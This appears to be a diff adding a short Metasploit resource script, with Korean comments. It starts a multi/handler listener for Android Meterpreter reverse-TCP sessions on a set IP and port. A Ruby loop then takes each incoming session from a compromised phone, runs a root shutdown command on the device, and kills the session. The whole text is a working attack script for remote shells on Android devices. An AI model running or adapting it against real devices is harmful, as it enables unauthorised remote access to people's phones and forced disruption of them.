@@ -1,0 +1,41 @@
+# securekim
+
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 172.31.47.49
+set ExitOnSession false
+
+exploit -j
+
+# sleep이 꼭 필요한건 아님, 깔끔하게 보이기.
+<ruby>
+	sleep(1)
+
+	print_status("Waiting on an incoming sessions...")
+	while (true)
+		framework.sessions.each_pair do |sid,s|
+			thost = s.session_host
+
+			# Ensure that stdapi has been loaded before running
+			if s.ext.aliases['stdapi']
+				print_status("Shutdown session #{sid} #{thost}...")
+				s.console.run_single("execute -f \"su -c 'am start -a android.intent.action.ACTION_REQUEST_SHUTDOWN --ez KEY_CONFIRM true --activity-clear-task'\"")
+				print_status("Closing session #{sid} #{thost}...")
+				s.kill
+			else
+				print_status("Session #{sid} #{thost} active, but not yet configured")
+			end
+
+		end
+		sleep(1)
+	end
+	print_status("All done")
+</ruby>
+
+# 모든 세션 종료
+sessions -K
+
+# 콘솔 종료(옵션)
+exit
+
